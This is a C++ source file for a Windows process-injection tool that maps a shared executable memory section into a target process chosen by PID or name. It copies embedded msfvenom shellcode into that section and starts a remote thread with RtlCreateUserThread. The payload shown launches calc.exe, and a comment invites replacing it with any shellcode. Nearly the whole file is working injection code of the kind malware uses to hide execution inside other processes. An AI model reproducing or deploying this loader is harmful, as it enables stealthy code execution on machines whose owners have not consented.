#include <iostream>
#include <Windows.h>
#include <tlhelp32.h>

#include "ntos.h"

MyNtCreateSection NtCreateSection;
MyNtMapViewOfSection NtMapViewOfSection;
MyRtlCreateUserThread RtlCreateUserThread;

//obtain the PID of the target process
DWORD GetPID(wchar_t * processName)
{
	HANDLE processes;
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	processes = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (!Process32First(processes, &entry))
	{
		wprintf(L"[!] Error!\n");
		// clean the snapshot object
		CloseHandle(processes);          
	}
	while (Process32Next(processes, &entry))
	{
		if (!wcscmp(entry.szExeFile, processName))
		{
			return entry.th32ProcessID;
			break;
		}
	}
}

void Usage() {
	wprintf(L"Mimir.exe PID 1000 or \nMimir.exe process explorer.exe\n Exiting...");
}

int wmain(int argc, wchar_t* argv[])
{
	if (argc < 3 ) {
		Usage();
		return -1;
	}

	//append your shellcode here
	//msfvenom -a x86 EXITFUNC=thread --platform windows -p windows/exec cmd=calc.exe -f c
	unsigned char buf[] =
		"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
		"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
		"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
		"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
		"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
		"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
		"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
		"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
		"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
		"\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f"
		"\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x68\xa6\x95\xbd\x9d\xff\xd5"
		"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
		"\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

	HANDLE sectionHandle = NULL;
	PVOID sectionLocal = NULL;
	PVOID sectionTarget = NULL;
	LARGE_INTEGER maximumSize = { 4096 };
	SIZE_T viewSize = 4096;
	HANDLE targetThreadHandle;
	CLIENT_ID cid;
	HANDLE processHandle = NULL;
	DWORD PID;

	HMODULE ntdll = GetModuleHandleA("ntdll.dll");

	NtCreateSection = (MyNtCreateSection)GetProcAddress(ntdll, "NtCreateSection");
	if (!NtCreateSection) {
		return FALSE;
	}
	else {
		wprintf(L"[>] NtCreateSection is at: 0x%p.\n", static_cast<void*>(NtCreateSection));
	}

	NtMapViewOfSection = (MyNtMapViewOfSection)GetProcAddress(ntdll, "NtMapViewOfSection");
	if (!NtMapViewOfSection) {
		return FALSE;
	}
	else {
		wprintf(L"[>] NtMapViewOfSection is at: 0x%p.\n", static_cast<void*>(NtMapViewOfSection));
 	}

	RtlCreateUserThread = (MyRtlCreateUserThread)GetProcAddress(ntdll, "RtlCreateUserThread");
	if (!RtlCreateUserThread) {
		return FALSE;
	}
	else {
		wprintf(L"[>] RtlCreateUserThread is at: 0x%p.\n", static_cast<void*>(RtlCreateUserThread));
	}

	//create memory section
	NtCreateSection(&sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&maximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

	//create a view of the memory section in the current process
	NtMapViewOfSection(sectionHandle, GetCurrentProcess(), &sectionLocal, NULL, NULL, NULL, &viewSize, 2, NULL, PAGE_READWRITE);
	wprintf(L"[>] Section local BaseAddress: 0x%p.\n", static_cast<void*>(sectionLocal));
	
	//create a view of the memory in the target notepad process
	if (!wcscmp(argv[1], L"PID")) {
		PID = _wtoi(argv[2]);
	}
	else {
		PID = GetPID(argv[2]);
	}

	wprintf(L"[>] Target process PID found: %d.\n", PID);
	wprintf(L"[>] Trying to open a handle to the target process...\n");
	processHandle = OpenProcess(PROCESS_ALL_ACCESS, false, PID);

	NtMapViewOfSection(sectionHandle, processHandle, &sectionTarget, NULL, NULL, NULL, &viewSize, 2, NULL, PAGE_EXECUTE_READ);
	wprintf(L"[>] Section remote BaseAddress: 0x%p.\n", static_cast<void*>(sectionTarget));

	//copy shellcode to the local view; it will be reflected to the target process's mapped view
	memcpy(sectionLocal, buf, sizeof(buf));
	wprintf(L"[>] Trying to copy the shellcode to the new section of the current process...\n");
	

	RtlCreateUserThread(processHandle, NULL, FALSE, 0, 0, 0, sectionTarget, NULL, &targetThreadHandle, &cid);
	wprintf(L"[>] Trying to pop calc...\n" );
	wprintf(L"[>] Done\n");
}